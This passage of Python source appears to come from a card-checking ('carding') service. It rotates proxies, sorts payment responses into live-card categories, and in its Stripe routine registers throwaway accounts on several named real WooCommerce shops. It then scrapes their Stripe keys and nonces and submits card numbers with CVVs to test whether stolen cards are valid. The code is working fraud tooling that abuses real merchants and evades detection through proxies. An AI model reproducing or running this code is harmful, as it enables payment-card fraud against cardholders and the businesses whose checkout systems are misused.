    if proxy not in _proxy_sems: _proxy_sems[proxy] = asyncio.Semaphore(PER_PROXY_CONCURRENCY)
    return _proxy_sems[proxy]

def mark_proxy_ok(proxy: str):
    if proxy: _proxy_fail_streak.pop(proxy, None)

def mark_proxy_fail(proxy: str) -> bool:
    if not proxy: return False
    _proxy_fail_streak[proxy] += 1
    if _proxy_fail_streak[proxy] >= PROXY_FAIL_THRESHOLD:
        _dead_proxies_run.add(proxy)
        return True
    return False

def normalize_proxy(line: str) -> Optional[str]:
    if not line: return None
    p = line.strip()
    if not p or p.startswith("#") or p.startswith("//"): return None
    scheme = "http"
    if p.startswith("socks5://"): scheme = "socks5"; p = p[9:]
    elif p.startswith("socks4://"): scheme = "socks4"; p = p[9:]
    elif p.startswith("http://"): scheme = "http"; p = p[7:]
    elif p.startswith("https://"): scheme = "https"; p = p[8:]
    if "@" in p:
        auth, hostport = p.split("@", 1)
        if ":" not in auth or ":" not in hostport: return None
        user, pw = auth.split(":", 1)
        host, port = hostport.rsplit(":", 1)
        return f"{scheme}://{user}:{pw}@{host}:{port}"
    parts = p.split(":")
    if len(parts) == 4: return f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"{scheme}://{parts[0]}:{parts[1]}"
    return None

def _proxy_to_url(p: str) -> str:
    if "://" in p: return p
    parts = p.split(":")
    return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}" if len(parts) == 4 else f"http://{p}"

def user_proxy_list(uid):
    with db() as c: return [r["proxy"] for r in c.execute("SELECT proxy FROM user_proxies WHERE uid=? AND status='live' ORDER BY id", (uid,)).fetchall()]

def user_proxy_all(uid):
    with db() as c: return c.execute("SELECT * FROM user_proxies WHERE uid=? ORDER BY id DESC", (uid,)).fetchall()

def clear_user_proxies(uid):
    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=?", (uid,))

def remove_user_proxy(uid: int, proxy: str):
    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, proxy))

def proxy_display(proxy: str) -> str:
    if "@" in proxy and "://" in proxy:
        try:
            scheme, rest = proxy.split("://", 1)
            if "@" in rest: return f"{scheme}://***:***@{rest.rsplit('@', 1)[1]}"
        except: pass
    return proxy[:60]

async def check_proxy_live(proxy: str) -> Dict[str, Any]:
    start = time.time()
    proxy_url = _proxy_to_url(proxy)
    try:
        is_socks = proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
        if is_socks:
            if not HAS_SOCKS: return {"ok": False, "latency": 0, "error": "aiohttp_socks missing"}
            connector = ProxyConnector.from_url(proxy_url)
        else:
            connector = aiohttp.TCPConnector(force_close=True, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(PROXY_TEST_URL, proxy=None if is_socks else proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT)) as r:
                if r.status == 200:
                    txt = await r.text(errors="ignore")
                    if txt and any(c.isdigit() for c in txt): return {"ok": True, "latency": round(time.time() - start, 2)}
                    return {"ok": False, "latency": round(time.time() - start, 2), "error": "bad body"}
                return {"ok": False, "latency": round(time.time() - start, 2), "error": f"HTTP {r.status}"}
    except asyncio.TimeoutError: return {"ok": False, "latency": round(time.time() - start, 2), "error": "Timeout"}
    except Exception as e: return {"ok": False, "latency": round(time.time() - start, 2), "error": _sanitize_err(str(e)[:80])}

async def check_proxy_hq(proxy: str) -> Dict[str, Any]:
    r = await check_proxy_live(proxy)
    return {"ok": r.get("ok"), "latency": r.get("latency", 0), "error": r.get("error", "")}

def parse_proxy_txt(raw: str) -> List[str]:
    if not raw: return []
    out, seen = [], set()
    for t in re.split(r"[\r\n,;\t]+", raw):
        t = t.strip()
        if len(t) < 6: continue
        n = normalize_proxy(t)
        if n and n not in seen: seen.add(n); out.append(n)
    return out

async def preflight_proxies(uid: int, proxies: List[str]) -> Dict[str, Any]:
    result = {"tested": 0, "live": [], "dead": [], "total": len(proxies), "latencies": {}}
    if not proxies: return result
    sem, lock = asyncio.Semaphore(PROXY_TEST_BATCH), asyncio.Lock()
    async def one(p: str):
        async with sem:
            res = await check_proxy_hq(p)
            async with lock:
                result["tested"] += 1
                if res.get("ok"): result["live"].append(p); result["latencies"][p] = res.get("latency", 0)
                else: result["dead"].append(p)
    await asyncio.gather(*(one(p) for p in proxies))
    if result["dead"]:
        with db() as c:
            for p in result["dead"]: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, p))
    if result["live"]:
        now = datetime.now(timezone.utc).isoformat()
        with db() as c:
            for p in result["live"]: c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?", (result["latencies"].get(p, 0), now, uid, p))
    return result

async def add_proxies_bulk(uid: int, proxies: List[str]) -> Dict[str, Any]:
    result = {"added": 0, "live": 0, "dead": 0, "rejected": 0, "limit_hit": False, "total_parsed": len(proxies)}
    with db() as c: existing = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (uid,)).fetchone()["n"]
    if existing >= LIVE_PROXY_LIMIT: result["limit_hit"] = True; return result
    slots = LIVE_PROXY_LIMIT - existing
    new_proxies, seen_set = [], set()
    with db() as c: existing_set = {r["proxy"] for r in c.execute("SELECT proxy FROM user_proxies WHERE uid=?", (uid,)).fetchall()}
    for p in proxies:
        if len(new_proxies) >= slots: break
        if p in existing_set or p in seen_set: result["rejected"] += 1; continue
        new_proxies.append(p); seen_set.add(p)
    if not new_proxies: return result
    with db() as c:
        for p in new_proxies: c.execute("INSERT OR IGNORE INTO user_proxies(uid, proxy, status) VALUES (?, ?, 'unknown')", (uid, p))
    result["added"] = len(new_proxies)
    sem, results = asyncio.Semaphore(PROXY_TEST_BATCH), {}
    async def one(p):
        async with sem: results[p] = await check_proxy_hq(p)
    await asyncio.gather(*(one(p) for p in new_proxies))
    live_found, dead_found, to_delete = 0, 0, []
    now = datetime.now(timezone.utc).isoformat()
    with db() as c: current_live = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=? AND status='live'", (uid,)).fetchone()["n"]
    for p in new_proxies:
        if results.get(p, {}).get("ok"):
            if current_live < LIVE_PROXY_LIMIT:
                current_live += 1; live_found += 1
                with db() as c: c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?", (results[p].get("latency", 0), now, uid, p))
            else: to_delete.append(p)
        else: dead_found += 1; to_delete.append(p)
    if to_delete:
        with db() as c:
            for p in to_delete: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, p))
    result["live"], result["dead"] = live_found, dead_found
    return result

async def lookup_bin(bin_number):
    try:
        with db() as c:
            row = c.execute("SELECT data FROM bin_cache WHERE bin=?", (bin_number[:6],)).fetchone()
            if row: return json.loads(row["data"])
    except: pass
    try:
        async def fetch():
            async with aiohttp.ClientSession() as sess:
                async with sess.get(f"https://data.handyapi.com/bin/{bin_number}", timeout=aiohttp.ClientTimeout(total=5)) as r:
                    if r.status == 200:
                        data = await r.json()
                        if data.get("Status") == "SUCCESS":
                            try:
                                async with _get_write_lock():
                                    with db() as c: c.execute("INSERT OR REPLACE INTO bin_cache(bin, data, ts) VALUES (?,?,?)", (bin_number[:6], json.dumps(data), datetime.now(timezone.utc).isoformat()))
                            except: pass
                            return data
                    return {"error": "BIN not found"}
        return await asyncio.wait_for(fetch(), timeout=6.0)
    except Exception: return {"error": "BIN API unreachable"}

CHARGED_KEYWORDS = ("ORDER_PLACED","ORDER_PAID","PAYMENT_SUCCESSFULL","PAYMENT_CAPTURED","PAYMENT_COMPLETED","PAYMENT_FULFILLED")
SITE_ERROR_KEYWORDS = ("NO_PRODUCTS", "PRODUCTS_NOT_FOUND", "PAYMENTS_ZONE_NOT_FOUND", "INVALID_SHOP","INVALID_PURCHASE_TYPE", "REQUIRED_ARTIFACTS_UNAVAILABLE", "SUBSCRIPTION_REQUIRED","SITE ERROR", "CART FAILED", "NO PRODUCT", "TIMEOUT", "THROTTLED","CAPTCHA_REQUIRED", "BOT_BLOCK", "HTTP 429", "HTTP 503", "HTTP 401", "HTTP 403","DELIVERY", "VAULT", "SESSION TOKEN", "CHECKOUT ERROR","OUT OF STOCK", "UNAVAILABLE", "MINIMUM", "SECURITY_VIOLATION","LOGIN REQUIRED", "SITE REQUIRES LOGIN","SITE_REQUIRED", "NO_SITE", "SITE_MISSING", "INVALID_SITE","APPLICATION NOT FOUND", "APP NOT FOUND", "404 NOT FOUND","INTERNAL SERVER ERROR", "BAD GATEWAY", "NOT FOUND")
NSF_KEYWORDS = ("INSUFFICIENT_FUNDS", "NSF", "INSUFFICIENT FUNDS")
CCN_KEYWORDS = ("INCORRECT_CVC", "INVALID_CVC", "CVV", "WRONG_CVV", "INCORRECT_ZIP")
THREE_DS_KEYWORDS = ("3DS", "3D_SECURE", "3D SECURE", "AUTHENTICATION_REQUIRED", "OTP_REQUIRED", "OTP")
DECLINE_KEYWORDS = ("DECLINED", "DECLINE","DO_NOT_HONOR", "DO_NOT_HONOUR", "DO NOT HONOR", "DO NOT HONOUR","GENERIC_DECLINE", "GENERIC DECLINE","INVALID_ACCOUNT", "INVALID ACCOUNT","INVALID_NUMBER", "INVALID NUMBER","INVALID_CARD", "INVALID CARD","INCORRECT_NUMBER", "INCORRECT NUMBER","CARD_NOT_ACTIVE", "CARD NOT ACTIVE","INACTIVE_CARD", "INACTIVE CARD","FRAUDULENT", "SUSPECTED_FRAUD", "FRAUD_SUSPECTED","STOLEN_CARD", "STOLEN CARD","LOST_CARD", "LOST CARD","PICKUP_CARD", "PICKUP CARD", "PICK_UP_CARD", "PICK UP CARD","CALL_ISSUER", "CALL ISSUER", "CONTACT_ISSUER", "CONTACT ISSUER","EXPIRED_CARD", "EXPIRED CARD", "CARD_EXPIRED", "CARD EXPIRED","RESTRICTED_CARD", "RESTRICTED CARD","CARD_NOT_SUPPORTED", "CARD NOT SUPPORTED","UNSUPPORTED_CARD", "UNSUPPORTED CARD","TRANSACTION_NOT_ALLOWED", "TRANSACTION NOT ALLOWED","NOT_PERMITTED", "NOT PERMITTED","NOT_ALLOWED", "NOT ALLOWED","BIN_BLOCKED", "BIN BLOCKED","BLOCKED_CARD", "BLOCKED CARD","AUTHENTICATION_FAILED", "AUTHENTICATION FAILED","AUTHORIZATION_FAILED", "AUTHORIZATION FAILED")
PROXY_ERROR_KEYWORDS = ("PROXY ERROR","CANNOT CONNECT","CONNECTION REFUSED","TUNNEL CONNECTION FAILED","407 PROXY AUTH","PROXY AUTH","PROXY DEAD","FAILED TO CONNECT","CONNECT CALL FAILED")
WORKING_SITE_CLASSES = ("declined", "charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds")

def _contains_any(upper_text: str, keywords) -> bool: return any(k in upper_text for k in keywords)

def parse_response(text: str, http_status: int = 200) -> Dict[str, Any]:
    raw_text   = text or ""
    full_upper = raw_text.upper()
    if http_status == 429 or "RATE LIMIT" in full_upper or "TOO MANY" in full_upper: return {"cls": "rate_limited", "response": "rate_limited", "raw": raw_text[:500], "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if http_status >= 500: return {"cls": "site_error", "response": f"HTTP {http_status}", "raw": raw_text[:500], "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    data = {}
    s = raw_text.strip()
    if s.startswith(("{", "[")):
        try:
            parsed = json.loads(s)
            if isinstance(parsed, list) and parsed and isinstance(parsed[0], dict): data = parsed[0]
            elif isinstance(parsed, dict): data = parsed
        except: pass
    charged_flag  = str(data.get("Charged",  "False")).strip().lower() == "true"
    approved_flag = str(data.get("Approved", "False")).strip().lower() == "true"
    resp_msg      = str(data.get("Response", data.get("response", data.get("message", data.get("error", "")))) or "").strip()
    gateway       = str(data.get("Gate", data.get("Gateway", data.get("gateway", "Shopify"))) or "Shopify").strip()
    check_time    = str(data.get("Time", data.get("time", "")) or "").strip()
    price_raw     = str(data.get("Price", data.get("price", data.get("amount", "0"))) or "0")
    amount, currency, pp = 0.0, "USD", price_raw.strip().split()
    if pp:
        try: amount = float(pp[0].replace("?","0").replace("$",""))
        except: pass
        if len(pp) > 1 and pp[1].isalpha(): currency = pp[1].upper()
    if not resp_msg: resp_msg = raw_text.strip()[:200] or "unknown"
    ru, fu = resp_msg.upper(), full_upper
    LIVE_RESPONSES = {"INSUFFICIENT_FUNDS", "NSF", "INSUFFICIENT FUNDS","INCORRECT_CVC", "INVALID_CVC", "WRONG_CVV", "INCORRECT_ZIP","OTP_REQUIRED", "AUTHENTICATION_REQUIRED","3DS", "3D_SECURE", "3D SECURE"}
    HARD_DECLINE = {"CARD_DECLINED", "DECLINED", "DECLINE","DO_NOT_HONOR", "DO_NOT_HONOUR", "DO NOT HONOR", "DO NOT HONOUR","GENERIC_DECLINE", "FRAUDULENT", "SUSPECTED_FRAUD","STOLEN_CARD", "LOST_CARD", "PICKUP_CARD", "PICK_UP_CARD","CALL_ISSUER", "CONTACT_ISSUER","EXPIRED_CARD", "CARD_EXPIRED","RESTRICTED_CARD", "CARD_NOT_SUPPORTED", "UNSUPPORTED_CARD","TRANSACTION_NOT_ALLOWED", "NOT_PERMITTED", "NOT_ALLOWED","BLOCKED_CARD", "BIN_BLOCKED","INVALID_ACCOUNT", "CARD_NOT_ACTIVE", "INACTIVE_CARD","INVALID_NUMBER", "INCORRECT_NUMBER", "INVALID_CARD","AUTHENTICATION_FAILED", "AUTHORIZATION_FAILED"}
    if charged_flag or _contains_any(ru, CHARGED_KEYWORDS): cls = "charged"
    elif _contains_any(fu, PROXY_ERROR_KEYWORDS): cls = "proxy_error"
    elif _contains_any(ru, SITE_ERROR_KEYWORDS): cls = "site_error"
    elif _contains_any(ru, THREE_DS_KEYWORDS): cls = "approved_3ds"
    elif _contains_any(ru, NSF_KEYWORDS): cls = "approved_nsf"
    elif _contains_any(ru, CCN_KEYWORDS): cls = "approved_ccn"
    elif any(k in ru for k in HARD_DECLINE): cls = "declined"
    elif _contains_any(ru, DECLINE_KEYWORDS): cls = "declined"
    elif approved_flag and any(k in ru for k in LIVE_RESPONSES): cls = "approved"
    else: cls = "declined"
    return {"cls": cls, "response": resp_msg[:200], "amount": amount, "currency": currency, "gateway": gateway, "check_time": check_time, "success": cls in ("charged","approved","approved_nsf","approved_ccn","approved_3ds"), "raw": raw_text[:500], "http": http_status}

def is_hit(cls): return cls in ("charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds")

_STRIPE_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
_STRIPE_SITES = ["https://innercitytigers.com", "https://www.professionalmarine.eu", "https://www.domainegayda.com", "https://ecolution-hubs.co.uk", "https://shop.nemaneide.com"]
_STRIPE_NONCE_PATTERNS = [r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"', r'"createSetupIntentNonce"\s*:\s*"(.*?)"', r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"', r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"', r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"', r'"nonce"\s*:\s*"([a-f0-9]+)"']
_STRIPE_BAD_RESPONSES = {"", "0", "null", "false", "-1", "undefined"}

def _stripe_rand_str(length=10): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
def _stripe_extract_error(text: str) -> str:
    m = re.search(r'"decline_code"\s*:\s*"([^"]+)"', text)
    if m: return m.group(1).upper()
    m = re.search(r'"message"\s*:\s*"([^"]+)"', text)
    if m: return m.group(1)
    m = re.search(r'"code"\s*:\s*"([^"]+)"', text)
    if m: return m.group(1).upper()
    return ''
def _stripe_is_bad_body(text: str) -> bool:
    if text is None: return True
    s = str(text).strip()
    if s.lower() in _STRIPE_BAD_RESPONSES: return True
    if s.startswith("{") and s.endswith("}"):
        try:
            j = json.loads(s)
            if not j or (j.get("success") is False and not j.get("data")): return True
        except: pass
    return False
def _stripe_make_session(proxy_url, jar, timeout):
    if proxy_url and proxy_url.startswith(("socks5://", "socks5h://", "socks4://")):
        if not HAS_SOCKS: raise RuntimeError("aiohttp_socks required")
        return aiohttp.ClientSession(timeout=timeout, cookie_jar=jar, connector=ProxyConnector.from_url(proxy_url))
    return aiohttp.ClientSession(timeout=timeout, cookie_jar=jar)
def _stripe_req_proxy(proxy_url):
    if not proxy_url or proxy_url.startswith(("socks5://", "socks5h://", "socks4://")): return None
    return proxy_url
async def _stripe_extract_pk(session, site, headers, proxy_arg):
    for url in [f'{site}/my-account/add-payment-method/', f'{site}/my-account/', f'{site}/checkout/', f'{site}/']:
        try:
            async with session.get(url, headers=headers, ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=8) as resp:
                text = await resp.text()
                for pat in [r'pk_live_[a-zA-Z0-9]{20,}', r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"']:
                    match = re.search(pat, text)
                    if match: return match.group(0) if pat.startswith(r'pk_live') else match.group(1)
        except: continue
    return None
async def _stripe_fetch_nonce(session, site_url, headers, proxy_arg):
    for path in ['/my-account/add-payment-method/', '/my-account/payment-methods/', '/checkout/', '/my-account/']:
        try:
            async with session.get(f"{site_url}{path}", headers=headers, ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=8) as resp: page_text = await resp.text()
            for pattern in _STRIPE_NONCE_PATTERNS:
                m = re.search(pattern, page_text)
                if m: return m.group(1)
        except: continue
    return None
async def _stripe_confirm_setup(session, site_url, pm_id, nonce, proxy_arg):
    confirm_headers = {"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": _STRIPE_UA,"Origin": site_url,"Referer": f"{site_url}/my-account/add-payment-method/"}
    confirm_data = {'action': 'create_and_confirm_setup_intent','wc-stripe-payment-method': pm_id,'wc-stripe-payment-type': 'card','_ajax_nonce': nonce}
    result_text = ''
    for ep_url, ep_params, ep_data in [(f"{site_url}/", {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, confirm_data),(f"{site_url}/wp-admin/admin-ajax.php", {}, {**confirm_data, 'action': 'wc_stripe_create_and_confirm_setup_intent'})]:
        try:
            async with session.post(ep_url, params=ep_params, headers=confirm_headers, data=ep_data, ssl=False, proxy=proxy_arg, timeout=10) as resp:
                result_text = await resp.text()
                if resp.status == 200 and not _stripe_is_bad_body(result_text): return result_text
        except: continue
    return result_text
def _stripe_classify(result_text: str) -> dict:
    if _stripe_is_bad_body(result_text): return {"cls": "error", "response": "Empty AJAX", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    rl, err_msg = result_text.lower(), _stripe_extract_error(result_text)
    if any(k in rl for k in ['"success":true', '"status":"succeeded"', 'payment method added', 'payment_method_added']):
        if 'decline' in rl or 'card_declined' in rl: return {"cls": "declined", "response": err_msg or "CARD_DECLINED", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
        return {"cls": "approved", "response": "Payment Method Added Successfully", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    if any(k in rl for k in ['requires_action', 'authentication_required', '3d_secure', '"status":"requires_confirmation"', 'redirect_to_url']): return {"cls": "approved_3ds", "response": "LIVE · 3DS Challenge Required", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    if 'card_not_supported' in rl: return {"cls": "declined", "response": "card_not_supported", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    if any(k in rl for k in ['incorrect_cvc', 'incorrect_zip', 'insufficient_funds', 'invalid_cvc', 'cvc_check_failed']): return {"cls": "approved_ccn", "response": err_msg or "CCN LIVE", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    if any(k in rl for k in ['card_declined', 'generic_decline', 'do_not_honor', 'fraudulent', 'lost_card', 'stolen_card', 'pickup_card', 'restricted_card', 'transaction_not_allowed', 'security_violation']): return {"cls": "declined", "response": err_msg or "CARD_DECLINED", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    if 'expired_card' in rl or 'expired' in rl: return {"cls": "declined", "response": "EXPIRED_CARD", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    if any(k in rl for k in ['velocity', 'too_many', 'rate_limit']): return {"cls": "error", "response": err_msg or "VELOCITY_EXCEEDED", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    if '"success":false' in rl or '"error"' in rl: return {"cls": "declined", "response": err_msg or "Unknown Error", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    if err_msg: return {"cls": "declined", "response": err_msg, "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    clean = result_text.strip()[:120]
    return {"cls": "error", "response": "Empty AJAX", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""} if _stripe_is_bad_body(clean) else {"cls": "declined", "response": clean, "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
async def _stripe_try_site(site_url, cc, mm, yy, cvv, proxy_url=None):
    site_domain, email, gu, mu, si = site_url.replace('https://', '').replace('http://', '').rstrip('/'), f"{_stripe_rand_str()}@gmail.com", str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
    headers_site = {"User-Agent": _STRIPE_UA, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
    jar, proxy_arg = aiohttp.CookieJar(unsafe=True), _stripe_req_proxy(proxy_url)
    try: session = _stripe_make_session(proxy_url, jar, aiohttp.ClientTimeout(total=20))
    except: return None
    async with session:
        stripe_pk = await _stripe_extract_pk(session, site_url, headers_site, proxy_arg)
        if not stripe_pk: return None
        reg_nonce = None
        for path in ['/my-account/', '/my-account-2/', '/register/']:
            try:
                async with session.get(f"{site_url}{path}", headers=headers_site, ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=8) as resp: page_text = await resp.text()
                for pattern in [r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r'id="woocommerce-register-nonce"[^>]*value="([^"]+)"', r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"']:
                    m = re.search(pattern, page_text)
                    if m: reg_nonce = m.group(1); break
                if reg_nonce: break
            except: continue
        if not reg_nonce: return None
        try:
            async with session.post(f"{site_url}/my-account/", data={'email': email, '_wp_http_referer': '/my-account/', 'register': 'Register', 'woocommerce-register-nonce': reg_nonce}, headers={"User-Agent": _STRIPE_UA, "Content-Type": "application/x-www-form-urlencoded", "Origin": site_url, "Referer": f"{site_url}/my-account/"}, ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=10) as resp: await resp.text()
        except: return None
        if not any('wordpress_logged_in' in k for k in {c.key: c.value for c in jar}): return None
        nonce = await _stripe_fetch_nonce(session, site_url, headers_site, proxy_arg)
        if not nonce: return None
        stripe_data = (f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[name]=John%20Doe&billing_details[email]={email}&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2F{site_domain}&time_on_page={random.randint(20000, 50000)}&guid={gu}&muid={mu}&sid={si}&key={stripe_pk}&_stripe_version=2024-06-20")
        try:
            async with session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data, headers={"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "User-Agent": _STRIPE_UA}, ssl=False, proxy=proxy_arg, timeout=10) as resp: stripe_text = await resp.text()
        except: return None
        try: stripe_json = json.loads(stripe_text)
        except: stripe_json = {}
        if 'error' in stripe_json:
            err = stripe_json['error']
            return {"cls": "declined", "response": err.get('decline_code') or err.get('code') or err.get('message') or 'TOKENIZATION_FAILED', "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
        pm_id = stripe_json.get('id', '')
        if not pm_id or not pm_id.startswith('pm_'): return None
        result_text = await _stripe_confirm_setup(session, site_url, pm_id, nonce, proxy_arg)
        if _stripe_is_bad_body(result_text): return None
        return _stripe_classify(result_text)
async def call_stripe_api(cc_str: str, proxy_str=None) -> dict:
    try:
        parts = cc_str.strip().split('|')
        if len(parts) != 4: return {"cls": "error", "response": "Invalid card format", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
        cc, mm, yy, cvv = parts[0].strip().replace(' ', ''), parts[1].strip().zfill(2), parts[2].strip(), parts[3].strip()
        if len(yy) == 2: yy = '20' + yy
        sites = list(_STRIPE_SITES); random.shuffle(sites)
        for site_url in sites:
            try:
                result = await _stripe_try_site(site_url, cc, mm, yy, cvv, proxy_str)
                if result and isinstance(result, dict) and not _stripe_is_bad_body(result.get("response", "")): return result
            except: continue
        return {"cls": "error", "response": "All sites failed", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}
    except Exception as e: return {"cls": "error", "response": f"Exception: {str(e)[:80]}", "amount": 0.0, "currency": "USD", "gateway": "Stripe-Auth2", "check_time": ""}

_direct_http_session: Optional[aiohttp.ClientSession] = None
_proxy_http_session: Optional[aiohttp.ClientSession] = None
def direct_session() -> aiohttp.ClientSession:
    global _direct_http_session
    if _direct_http_session is None or _direct_http_session.closed:
        _direct_http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=5000, limit_per_host=5000, ttl_dns_cache=300, enable_cleanup_closed=True, ssl=False), timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=PROXY_CONNECT_TIMEOUT, sock_read=PROXY_SOCK_READ_TIMEOUT))
    return _direct_http_session
def proxy_client_session() -> aiohttp.ClientSession:
    global _proxy_http_session
    if _proxy_http_session is None or _proxy_http_session.closed:
        _proxy_http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=5000, limit_per_host=5000, force_close=True, ttl_dns_cache=300, enable_cleanup_closed=True, ssl=False), timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=PROXY_CONNECT_TIMEOUT, sock_read=PROXY_SOCK_READ_TIMEOUT))
    return _proxy_http_session
def _proxy_exc(e): return any(k in str(e).upper() for k in ("PROXY","TUNNEL","407","CANNOT CONNECT","CONNECTION REFUSED","CONNECT CALL FAILED"))
def _build_api_request(ep: Dict[str, Any], cc: str, proxy: Optional[str], site: Optional[str]):
    import urllib.parse
    api_site = site if not site or site.startswith("http") else f"https://{site}"
    if ep.get("style", "params") == "raw":
        base, sep = ep["url"], "&" if "?" in ep["url"] else "?"
        parts = [urllib.parse.quote(cc, safe=""), f"proxy={urllib.parse.quote(proxy or '', safe=':@')}"]
        if api_site: parts.append(f"site={urllib.parse.quote(api_site, safe=':/')}")
        if ep.get("key"): parts.append(f"key={urllib.parse.quote(str(ep['key']), safe='')}")
        return f"{base}{sep}{'&'.join(parts)}", None
    params = [("cc", cc), ("proxy", proxy or "")]
    if api_site: params.append(("site", api_site))
    if ep.get("key"): params.append(("key", str(ep["key"])))
    return ep["url"], params

async def _do_api_call(ep: Dict[str, Any], cc: str, proxy: Optional[str], site: Optional[str], uid: Optional[int], timeout: Optional[float]) -> Dict[str, Any]:
    url, params = _build_api_request(ep, cc, proxy, site)
    ep_url, ct = ep["url"], aiohttp.ClientTimeout(total=timeout or CHECK_TIMEOUT, connect=min(PROXY_CONNECT_TIMEOUT, timeout or CHECK_TIMEOUT), sock_read=min(PROXY_SOCK_READ_TIMEOUT, timeout or CHECK_TIMEOUT))
    proxy_url = _proxy_to_url(proxy) if proxy else None
    is_socks = proxy_url and proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
    try:
        if proxy:
            async with proxy_sem(proxy):
                if is_socks:
                    if not HAS_SOCKS: return {"cls": "error", "response": "aiohttp_socks required for SOCKS proxies", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
                    connector = ProxyConnector.from_url(proxy_url)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        async with session.get(url, params=params, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
                else:
                    async with proxy_client_session().get(url, params=params, proxy=proxy_url, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
            mark_proxy_ok(proxy)
        else:
            async with direct_session().get(url, params=params, timeout=ct) as r: text, status = await r.text(errors="ignore"), r.status
        res = parse_response(text, status); res["response"] = _sanitize_err(res.get("response", ""))
        if res["cls"] == "site_error": mark_endpoint_fail(ep_url)
        else: mark_endpoint_ok(ep_url)
        if res["cls"] == "rate_limited": _bench_site(site or "", 180)
        elif res["cls"] == "proxy_error":
            dropped = mark_proxy_fail(proxy) if proxy else False
            if dropped and uid is not None and proxy: remove_user_proxy(uid, proxy)
            res["_dropped"] = dropped
        res.update({"_site": site or "", "_proxy": proxy, "_endpoint": ep_url, "_dropped": res.get("_dropped", False)})
        return res
    except asyncio.TimeoutError:
        mark_endpoint_fail(ep_url)
        dropped = mark_proxy_fail(proxy) if proxy else False
        if dropped and uid is not None and proxy: remove_user_proxy(uid, proxy)
        return {"cls": "timeout", "response": "timeout", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site or "", "_proxy": proxy, "_dropped": dropped, "_endpoint": ep_url}
    except Exception as e:
